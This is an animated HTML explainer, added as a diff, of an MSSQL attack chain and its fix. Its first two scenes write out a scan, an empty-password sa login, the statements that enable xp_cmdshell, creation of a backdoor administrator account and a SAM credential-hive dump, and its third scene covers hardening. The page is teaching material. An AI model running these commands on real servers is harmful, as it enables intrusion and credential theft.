@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>MSSQL 1433 — xp_cmdshell to OS Shell</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{
+  background:#0a0a0f;
+  font-family:'Press Start 2P',monospace;
+  width:100%;min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;
+  color:#fff;overflow-x:hidden;
+}
+.scene{width:390px;min-height:100vh;display:none;flex-direction:column}
+.scene.active{display:flex}
+.hdr{height:90px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:0 14px;border-bottom:1px solid #2a1f3d}
+.hdr-title{font-size:10px;color:#e85050;text-align:center;letter-spacing:.5px;line-height:1.7}
+.hdr-sub{font-size:9px;color:#666;text-align:center;letter-spacing:1px;line-height:1.5}
+.dots{display:flex;gap:8px}
+.dot{width:11px;height:11px;border-radius:50%;background:#2a1f3d;transition:background .2s}
+.dot.active{background:#e85050}
+.dot.done{background:#4eff9a}
+.slr{height:28px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.slabel{font-size:9px;letter-spacing:1px}
+.sbadge{font-size:7px;padding:3px 8px;border:1px solid currentColor;border-radius:2px}
+.anim{flex:1;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none}
+.anim::-webkit-scrollbar{display:none}
+.info{height:110px;flex-shrink:0;margin:0 12px;border:2px solid #e85050;padding:10px 14px;display:flex;flex-direction:column;justify-content:center;gap:7px;font-size:9px;line-height:1.9}
+.info.gn{border-color:#4eff9a}
+.info.am{border-color:#e8a020}
+.il{color:#ccc}
+.ih{color:#4eff9a}
+.ih.rd{color:#e85050}
+.ih.am{color:#e8a020}
+.srow{height:70px;flex-shrink:0;display:flex;gap:8px;padding:8px 12px}
+.sc{flex:1;background:#130d1e;border:1px solid #2a1f3d;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.sv{font-size:10px;color:#4ec9e1;text-align:center}
+.sv.am{color:#e8a020}
+.sv.gn{color:#4eff9a}
+.sv.rd{color:#e85050}
+.sl{font-size:7px;color:#777;text-align:center;line-height:1.4}
+.ctrl{height:68px;flex-shrink:0;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 12px;background:inherit}
+.btn{font-family:'Press Start 2P',monospace;font-size:9px;padding:10px 14px;border:2px solid #4ec9e1;background:transparent;color:#4ec9e1;cursor:pointer;transition:all .15s;white-space:nowrap}
+.btn:hover{background:#4ec9e130}
+.btn:active{transform:scale(.97)}
+.btn.play{border-color:#4eff9a;color:#4eff9a}
+.btn.play:hover{background:#4eff9a20}
+.btn.rd{border-color:#e85050;color:#e85050}
+.btn.rd:hover{background:#e8505020}
+.btn.am{border-color:#e8a020;color:#e8a020}
+.btn.am:hover{background:#e8a02020}
+
+/* ── terminal ── */
+.term{background:#060810;border:1px solid #1a1a2a;border-radius:3px;padding:8px 10px;font-size:7px;line-height:2.2;position:relative}
+.t-prompt{color:#e85050}
+.t-prompt2{color:#4ec9e1}
+.t-cmd{color:#e8a020}
+.t-out{color:#4eff9a}
+.t-err{color:#e85050}
+.t-comment{color:#444}
+.t-sys{color:#ff8c00}
+.term-line{opacity:0;transition:opacity .25s}
+
+/* ── step rows ── */
+.step-row{display:flex;align-items:flex-start;gap:8px;padding:6px 8px;border-radius:3px;background:#130d1e;opacity:0;transition:opacity .4s;border-left:3px solid #2a1f3d}
+.step-row.ok{border-color:#4eff9a}
+.step-row.rd{border-color:#e85050}
+.step-row.am{border-color:#e8a020}
+.step-row.info{border-color:#4ec9e1}
+.step-num{font-size:7px;color:#555;flex-shrink:0;min-width:14px}
+.step-txt{font-size:7px;color:#ccc;line-height:1.9}
+
+/* ── fix lines ── */
+.fix-line{font-size:7px;padding:5px 8px;background:#050c0f;border-left:3px solid #4eff9a;margin-bottom:4px;opacity:0;transition:opacity .3s;line-height:1.9;color:#aaa;border-radius:0 2px 2px 0;word-break:break-all}
+.fk{color:#4ec9e1}
+.fv{color:#4eff9a}
+.fr{color:#e8a020}
+.fe{color:#e85050}
+
+/* ── priv badge ── */
+.priv-badge{font-size:6px;padding:2px 6px;border-radius:2px;display:inline-block;margin-right:3px;margin-bottom:3px}
+.priv-badge.danger{background:#e8505020;border:1px solid #e8505060;color:#e85050}
+.priv-badge.safe{background:#4eff9a20;border:1px solid #4eff9a60;color:#4eff9a}
+
+/* ── compare rows ── */
+.cmp-row{display:flex;gap:5px;margin-bottom:4px;opacity:0;transition:opacity .35s}
+.cmp-kw{font-size:7px;min-width:62px;flex-shrink:0;padding:5px 6px;border-radius:2px;text-align:center}
+.cmp-cell{flex:1;font-size:6px;color:#ccc;line-height:2;padding:5px 7px;background:#130d1e;border:1px solid #1a1a2a;border-radius:2px}
+
+/* ── enable chain ── */
+.enable-chain{display:flex;flex-direction:column;gap:4px}
+.chain-step{display:flex;align-items:center;gap:6px;padding:5px 8px;border-radius:3px;background:#130d1e;border-left:3px solid #2a1f3d;opacity:0;transition:opacity .4s}
+.chain-step.fired{border-color:#e85050}
+.chain-step.done{border-color:#4eff9a}
+</style>
+</head>
+<body>
+
+<!-- ══════ SCENE 1: Discovery & sa Login ══════ -->
+<div class="scene active" id="s1" style="background:#120808">
+  <div class="hdr" style="background:#120808">
+    <div class="hdr-title">MSSQL 1433 — xp_cmdshell</div>
+    <div class="hdr-sub">SA ACCOUNT & INITIAL ACCESS</div>
+    <div class="dots">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr">
+    <span class="slabel" style="color:#e85050">STEP 1 — DISCOVERY</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">PORT 1433 OPEN</span>
+  </div>
+
+  <div class="anim" style="background:#120808">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <div style="font-size:8px;color:#888;line-height:1.8">MSSQL port 1433 on <span style="color:#e85050">0.0.0.0</span> means the SQL Server is internet-facing.</div>
+
+      <!-- nmap -->
+      <div style="font-size:7px;color:#444;letter-spacing:1px">NMAP SCAN</div>
+      <div class="term">
+        <div class="term-line" id="nm0"><span class="t-prompt">$ </span><span class="t-cmd">nmap -sV -p 1433 203.0.113.55</span></div>
+        <div class="term-line" id="nm1"><span class="t-comment"># PORT     STATE SERVICE    VERSION</span></div>
+        <div class="term-line" id="nm2"><span class="t-err">1433/tcp  open  ms-sql-s   Microsoft SQL Server 2019</span></div>
+        <div class="term-line" id="nm3"><span class="t-comment"># MSSQL exposed — checking sa account</span></div>
+      </div>
+
+      <!-- bind callout -->
+      <div style="display:flex;gap:8px">
+        <div style="flex:1;background:#e8505015;border:2px solid #e85050;border-radius:3px;padding:8px">
+          <div style="font-size:7px;color:#e85050;margin-bottom:4px">VULNERABLE</div>
+          <div style="font-size:7px;color:#aaa;line-height:2">TCP listener:<br><span style="color:#e85050">0.0.0.0:1433</span></div>
+        </div>
+        <div style="flex:1;background:#4eff9a0d;border:2px solid #4eff9a;border-radius:3px;padding:8px">
+          <div style="font-size:7px;color:#4eff9a;margin-bottom:4px">CORRECT</div>
+          <div style="font-size:7px;color:#aaa;line-height:2">TCP listener:<br><span style="color:#4eff9a">127.0.0.1:1433</span><br><span style="color:#555;font-size:5px">or firewall-blocked</span></div>
+        </div>
+      </div>
+
+      <!-- sa login attempt -->
+      <div style="font-size:7px;color:#444;letter-spacing:1px">TRY SA WITH EMPTY PASSWORD</div>
+      <div class="term">
+        <div class="term-line" id="sa0"><span class="t-prompt">$ </span><span class="t-cmd">sqlcmd -S 203.0.113.55 -U sa -P ""</span></div>
+        <div class="term-line" id="sa1"><span class="t-out">1&gt; </span><span class="t-cmd">SELECT @@VERSION;</span></div>
+        <div class="term-line" id="sa2"><span class="t-out">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5</span></div>
+        <div class="term-line" id="sa3"><span class="t-err">-- Logged in as sa — SYSTEM level SQL account</span></div>
+      </div>
+
+      <!-- sa privileges -->
+      <div style="opacity:0;transition:opacity .4s" id="s1_privs">
+        <div style="font-size:7px;color:#555;margin-bottom:5px">SA ACCOUNT PRIVILEGES</div>
+        <span class="priv-badge danger">sysadmin</span>
+        <span class="priv-badge danger">CONTROL SERVER</span>
+        <span class="priv-badge danger">xp_cmdshell</span>
+        <span class="priv-badge danger">sp_configure</span>
+        <span class="priv-badge danger">BULK INSERT</span>
+        <span class="priv-badge danger">ALTER SETTINGS</span>
+      </div>
+
+      <!-- check xp status -->
+      <div style="font-size:7px;color:#444;letter-spacing:1px">CHECK xp_cmdshell STATUS</div>
+      <div class="term">
+        <div class="term-line" id="xc0"><span class="t-out">1&gt; </span><span class="t-cmd">SELECT value FROM sys.configurations</span></div>
+        <div class="term-line" id="xc1"><span class="t-cmd">&nbsp;&nbsp;&nbsp;WHERE name = 'xp_cmdshell';</span></div>
+        <div class="term-line" id="xc2"><span class="t-comment">value</span></div>
+        <div class="term-line" id="xc3"><span class="t-err">0</span><span class="t-comment"> &nbsp;-- disabled, but re-enableable in 2 statements</span></div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info">
+    <div class="il">sa = SQL Server Administrator. Equivalent to root. Empty password still found in wild.</div>
+    <div class="ih rd">xp_cmdshell is disabled by default — but sa can re-enable it in two SQL statements.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">1433</div><div class="sl">PORT<br>EXPOSED</div></div>
+    <div class="sc"><div class="sv rd">sa</div><div class="sl">EMPTY<br>PASSWORD</div></div>
+    <div class="sc"><div class="sv am">OFF</div><div class="sl">xp_cmdshell<br>DEFAULT</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn rd play" onclick="playS1()">▶ PLAY</button>
+    <button class="btn" onclick="nav(2)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════ SCENE 2: Enable xp_cmdshell → RCE ══════ -->
+<div class="scene" id="s2" style="background:#120808">
+  <div class="hdr" style="background:#120808">
+    <div class="hdr-title">MSSQL 1433 — xp_cmdshell</div>
+    <div class="hdr-sub">TWO STATEMENTS TO OS SHELL</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr">
+    <span class="slabel" style="color:#e85050">STEP 2 — ENABLE & EXECUTE</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">NT AUTHORITY\SYSTEM</span>
+  </div>
+
+  <div class="anim" style="background:#120808">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <div style="font-size:8px;color:#888;line-height:1.8">Two SQL statements. Then any OS command runs as <span style="color:#e85050">nt authority\system</span>.</div>
+
+      <!-- enable chain animated -->
+      <div style="font-size:7px;color:#444;letter-spacing:1px">ENABLE xp_cmdshell (2 STATEMENTS)</div>
+      <div class="enable-chain">
+        <div class="chain-step" id="en0">
+          <div style="font-size:9px;flex-shrink:0">①</div>
+          <div style="font-size:7px;color:#aaa;line-height:1.8;flex:1">
+            <span style="color:#4ec9e1">EXEC</span> sp_configure <span style="color:#4eff9a">'show advanced options'</span>, <span style="color:#e8a020">1</span>;<br>
+            <span style="color:#4ec9e1">RECONFIGURE</span>;
+          </div>
+          <div style="font-size:6px;color:#555;flex-shrink:0">unlock</div>
+        </div>
+        <div class="chain-step" id="en1">
+          <div style="font-size:9px;flex-shrink:0">②</div>
+          <div style="font-size:7px;color:#aaa;line-height:1.8;flex:1">
+            <span style="color:#4ec9e1">EXEC</span> sp_configure <span style="color:#4eff9a">'xp_cmdshell'</span>, <span style="color:#e8a020">1</span>;<br>
+            <span style="color:#4ec9e1">RECONFIGURE</span>;
+          </div>
+          <div style="font-size:6px;color:#e85050;flex-shrink:0">ENABLED</div>
+        </div>
+      </div>
+
+      <!-- whoami -->
+      <div style="font-size:7px;color:#444;letter-spacing:1px">EXECUTE OS COMMANDS</div>
+      <div class="term">
+        <div class="term-line" id="w0"><span class="t-out">1&gt; </span><span class="t-cmd">EXEC xp_cmdshell 'whoami';</span></div>
+        <div class="term-line" id="w1"><span style="color:#ff8c00">nt authority\system</span></div>
+        <div class="term-line" id="w2"><span class="t-comment">-- Full OS access. Windows kernel level.</span></div>
+      </div>
+
+      <!-- escalation commands -->
+      <div style="font-size:7px;color:#444;letter-spacing:1px">BACKDOOR USER CREATION</div>
+      <div class="term">
+        <div class="term-line" id="bd0"><span class="t-out">1&gt; </span><span class="t-cmd">EXEC xp_cmdshell</span></div>
+        <div class="term-line" id="bd1"><span class="t-cmd">&nbsp;&nbsp;&nbsp;'net user backdoor P@ss123! /add';</span></div>
+        <div class="term-line" id="bd2"><span class="t-out">The command completed successfully.</span></div>
+        <div class="term-line" id="bd3"><span class="t-out">1&gt; </span><span class="t-cmd">EXEC xp_cmdshell</span></div>
+        <div class="term-line" id="bd4"><span class="t-cmd">&nbsp;&nbsp;&nbsp;'net localgroup administrators backdoor /add';</span></div>
+        <div class="term-line" id="bd5"><span class="t-out">The command completed successfully.</span></div>
+      </div>
+
+      <!-- more commands -->
+      <div style="font-size:7px;color:#444;letter-spacing:1px">MORE ESCALATION OPTIONS</div>
+      <div class="term">
+        <div class="term-line" id="mc0"><span class="t-comment">-- Read sensitive files</span></div>
+        <div class="term-line" id="mc1"><span class="t-out">1&gt; </span><span class="t-cmd">EXEC xp_cmdshell 'type C:\Windows\win.ini';</span></div>
+        <div class="term-line" id="mc2"><span class="t-comment">-- Dump credential hashes</span></div>
+        <div class="term-line" id="mc3"><span class="t-out">1&gt; </span><span class="t-cmd">EXEC xp_cmdshell 'reg save HKLM\SAM C:\sam.bak';</span></div>
+        <div class="term-line" id="mc4"><span class="t-comment">-- Lateral movement, reverse shell, ransomware...</span></div>
+      </div>
+
+      <!-- chain summary -->
+      <div style="opacity:0;transition:opacity .4s" id="s2_chain">
+        <div style="font-size:7px;color:#e85050;margin-bottom:5px;letter-spacing:1px">ATTACK CHAIN</div>
+        <div style="display:flex;align-items:center;gap:3px;font-size:7px;flex-wrap:wrap">
+          <span style="color:#e8a020;padding:3px 5px;border:1px solid #e8a02040;border-radius:2px;background:#e8a02012">1433 OPEN</span>
+          <span style="color:#555">→</span>
+          <span style="color:#e85050;padding:3px 5px;border:1px solid #e8505040;border-radius:2px;background:#e8505012">sa LOGIN</span>
+          <span style="color:#555">→</span>
+          <span style="color:#e85050;padding:3px 5px;border:1px solid #e8505040;border-radius:2px;background:#e8505012">sp_configure</span>
+          <span style="color:#555">→</span>
+          <span style="color:#e85050;padding:3px 5px;border:1px solid #e8505040;border-radius:2px;background:#e8505012">xp_cmdshell</span>
+          <span style="color:#555">→</span>
+          <span style="color:#ff8c00;padding:3px 5px;border:1px solid #ff8c0040;border-radius:2px;background:#ff8c0012">SYSTEM</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info">
+    <div class="il">sp_configure unlocks advanced options. xp_cmdshell then enabled in one more line.</div>
+    <div class="ih rd">EXEC xp_cmdshell 'whoami' → nt authority\system. Full Windows OS access.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">2</div><div class="sl">SQL STMTS<br>TO ENABLE</div></div>
+    <div class="sc"><div class="sv" style="color:#ff8c00">SYSTEM</div><div class="sl">RUNS AS<br>NT\SYSTEM</div></div>
+    <div class="sc"><div class="sv rd">FULL</div><div class="sl">OS<br>ACCESS</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="nav(1)">◀ PREV</button>
+    <button class="btn play" onclick="playS2()">▶ PLAY</button>
+    <button class="btn" onclick="nav(3)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════ SCENE 3: Hardening ══════ -->
+<div class="scene" id="s3" style="background:#081208">
+  <div class="hdr" style="background:#081208">
+    <div class="hdr-title">MSSQL 1433 — xp_cmdshell</div>
+    <div class="hdr-sub">HARDENING & REMEDIATION</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+    </div>
+  </div>
+
+  <div class="slr">
+    <span class="slabel" style="color:#4eff9a">STEP 3 — FIX IT</span>
+    <span class="sbadge" style="color:#4eff9a;border-color:#4eff9a">REMEDIATION</span>
+  </div>
+
+  <div class="anim" style="background:#081208">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <div style="font-size:8px;color:#888;line-height:1.8">Five changes that break this attack chain permanently.</div>
+
+      <!-- Fix 1: disable xp_cmdshell -->
+      <div class="fix-line" id="fx0">
+        <span class="fe"># Disable xp_cmdshell</span><br>
+        <span class="fk">EXEC</span> sp_configure <span class="fv">'xp_cmdshell'</span>, <span class="fv">0</span>;<br>
+        <span class="fk">RECONFIGURE</span>;<br>
+        <span class="fk">EXEC</span> sp_configure <span class="fv">'show advanced options'</span>, <span class="fv">0</span>;<br>
+        <span class="fk">RECONFIGURE</span>;
+      </div>
+
+      <!-- Fix 2: disable sa, use Windows auth -->
+      <div class="fix-line" id="fx1">
+        <span class="fe"># Disable sa account entirely</span><br>
+        <span class="fk">ALTER LOGIN</span> sa <span class="fv">DISABLE</span>;<br>
+        <span class="fk">ALTER LOGIN</span> sa WITH PASSWORD = <span class="fv">'C0mpl3x!R@nd0m'</span>;<br>
+        <span style="color:#555;font-size:6px"># Switch to Windows Authentication mode</span>
+      </div>
+
+      <!-- Fix 3: dedicated app login -->
+      <div class="fix-line" id="fx2">
+        <span class="fe"># Least-privilege app account</span><br>
+        <span class="fk">CREATE LOGIN</span> appuser WITH PASSWORD = <span class="fv">'...'</span>;<br>
+        <span class="fk">CREATE USER</span> appuser FOR LOGIN appuser;<br>
+        <span class="fk">GRANT SELECT, INSERT, UPDATE, DELETE</span><br>
+        &nbsp;&nbsp;<span class="fk">ON SCHEMA::</span><span class="fv">dbo</span> <span class="fk">TO</span> appuser;<br>
+        <span style="color:#555;font-size:6px"># No EXECUTE, no sysadmin, no ALTER</span>
+      </div>
+
+      <!-- Fix 4: firewall -->
+      <div class="fix-line" id="fx3" style="border-color:#e8a020">
+        <span class="fe"># Block 1433 at host firewall (Windows)</span><br>
+        <span class="fk">netsh</span> advfirewall firewall add rule<br>
+        &nbsp;&nbsp;name=<span class="fv">"Block MSSQL external"</span><br>
+        &nbsp;&nbsp;protocol=TCP localport=<span class="fv">1433</span> dir=in<br>
+        &nbsp;&nbsp;action=<span class="fr">block</span> remoteip=<span class="fv">!LAN_SUBNET</span>
+      </div>
+
+      <!-- Comparison -->
+      <div id="s3_table" style="opacity:0;transition:opacity .4s;display:flex;flex-direction:column;gap:5px">
+        <div style="font-size:7px;color:#4eff9a;letter-spacing:1px">BEFORE vs AFTER</div>
+        <div class="cmp-row" id="cr0">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">PORT</div>
+          <div class="cmp-cell" style="color:#e85050">1433 open to internet</div>
+          <div class="cmp-cell" style="color:#4eff9a">firewall-blocked, LAN only</div>
+        </div>
+        <div class="cmp-row" id="cr1">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">SA</div>
+          <div class="cmp-cell" style="color:#e85050">enabled, empty password</div>
+          <div class="cmp-cell" style="color:#4eff9a">disabled + Windows auth</div>
+        </div>
+        <div class="cmp-row" id="cr2">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">xp_cmd</div>
+          <div class="cmp-cell" style="color:#e85050">re-enableable by sa</div>
+          <div class="cmp-cell" style="color:#4eff9a">disabled + adv. options off</div>
+        </div>
+        <div class="cmp-row" id="cr3">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">APP USER</div>
+          <div class="cmp-cell" style="color:#e85050">app uses sa / sysadmin</div>
+          <div class="cmp-cell" style="color:#4eff9a">DML-only app account</div>
+        </div>
+
+        <div style="background:#0d1a0d;border-left:3px solid #4eff9a;padding:8px 10px;border-radius:0 3px 3px 0;opacity:0;transition:opacity .4s" id="s3_answer">
+          <div style="font-size:7px;color:#4eff9a;margin-bottom:4px">SECURITY RULE</div>
+          <div style="font-size:7px;color:#ccc;line-height:2">
+            Disable sa and use Windows Authentication. Block 1433 at the network perimeter — it should never be reachable from the internet. xp_cmdshell off by default; keep advanced options locked too.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info gn">
+    <div class="il">Disable sa. Use Windows auth. Block 1433 at firewall. xp_cmdshell off.</div>
+    <div class="ih">These four controls break every step of the attack chain shown in scenes 1 and 2.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv gn">DISABLE</div><div class="sl">SA<br>ACCOUNT</div></div>
+    <div class="sc"><div class="sv gn">OFF</div><div class="sl">xp_cmdshell<br>+ ADV OPT</div></div>
+    <div class="sc"><div class="sv gn">BLOCK</div><div class="sl">1433<br>EXTERNAL</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="nav(2)">◀ PREV</button>
+    <button class="btn play" onclick="playS3()">▶ PLAY</button>
+    <button class="btn am" onclick="nav(1)">↩ RESTART</button>
+  </div>
+</div>
+
+<script>
+var timers=[];
+function clearAll(){timers.forEach(function(t){clearTimeout(t);clearInterval(t);});timers=[];}
+function delay(fn,ms){var t=setTimeout(fn,ms);timers.push(t);}
+function show(id){var e=document.getElementById(id);if(e)e.style.opacity='1';}
+function hide(id){var e=document.getElementById(id);if(e)e.style.opacity='0';}
+
+function nav(n){
+  clearAll();
+  document.querySelectorAll('.scene').forEach(function(s){s.classList.remove('active');});
+  document.getElementById('s'+n).classList.add('active');
+  if(n===1)playS1();
+  if(n===2)playS2();
+  if(n===3)playS3();
+}
+
+/* ─── SCENE 1 ─── */
+function playS1(){
+  clearAll();
+  ['nm0','nm1','nm2','nm3',
+   'sa0','sa1','sa2','sa3',
+   'xc0','xc1','xc2','xc3'].forEach(hide);
+  hide('s1_privs');
+
+  var seq=['nm0','nm1','nm2','nm3'];
+  seq.forEach(function(id,i){delay(function(){show(id);},300+i*350);});
+
+  var sa=['sa0','sa1','sa2','sa3'];
+  sa.forEach(function(id,i){delay(function(){show(id);},300+4*350+300+i*380);});
+
+  delay(function(){show('s1_privs');},300+4*350+300+4*380+300);
+
+  var xbase=300+4*350+300+4*380+700;
+  ['xc0','xc1','xc2','xc3'].forEach(function(id,i){
+    delay(function(){show(id);},xbase+i*350);
+  });
+}
+
+/* ─── SCENE 2 ─── */
+function playS2(){
+  clearAll();
+  ['en0','en1'].forEach(function(id){
+    var e=document.getElementById(id);
+    if(e){e.style.opacity='0';e.classList.remove('fired','done');}
+  });
+  ['w0','w1','w2',
+   'bd0','bd1','bd2','bd3','bd4','bd5',
+   'mc0','mc1','mc2','mc3','mc4'].forEach(hide);
+  hide('s2_chain');
+
+  // enable chain steps
+  delay(function(){
+    show('en0');
+    document.getElementById('en0').classList.add('fired');
+  },400);
+  delay(function(){
+    document.getElementById('en0').classList.add('done');
+    document.getElementById('en0').classList.remove('fired');
+    show('en1');
+    document.getElementById('en1').classList.add('fired');
+  },1100);
+  delay(function(){
+    document.getElementById('en1').classList.add('done');
+    document.getElementById('en1').classList.remove('fired');
+  },1800);
+
+  // whoami
+  ['w0','w1','w2'].forEach(function(id,i){
+    delay(function(){show(id);},2200+i*400);
+  });
+
+  // backdoor
+  ['bd0','bd1','bd2','bd3','bd4','bd5'].forEach(function(id,i){
+    delay(function(){show(id);},3500+i*350);
+  });
+
+  // more cmds
+  ['mc0','mc1','mc2','mc3','mc4'].forEach(function(id,i){
+    delay(function(){show(id);},5600+i*300);
+  });
+
+  delay(function(){show('s2_chain');},7100);
+}
+
+/* ─── SCENE 3 ─── */
+function playS3(){
+  clearAll();
+  ['fx0','fx1','fx2','fx3'].forEach(hide);
+  hide('s3_table');
+  hide('s3_answer');
+  ['cr0','cr1','cr2','cr3'].forEach(hide);
+
+  delay(function(){show('fx0');},300);
+  delay(function(){show('fx1');},1100);
+  delay(function(){show('fx2');},1900);
+  delay(function(){show('fx3');},2700);
+  delay(function(){show('s3_table');},3400);
+  ['cr0','cr1','cr2','cr3'].forEach(function(id,i){
+    delay(function(){show(id);},3500+i*350);
+  });
+  delay(function(){show('s3_answer');},5000);
+}
+
+playS1();
+</script>
+</body>
+</html>
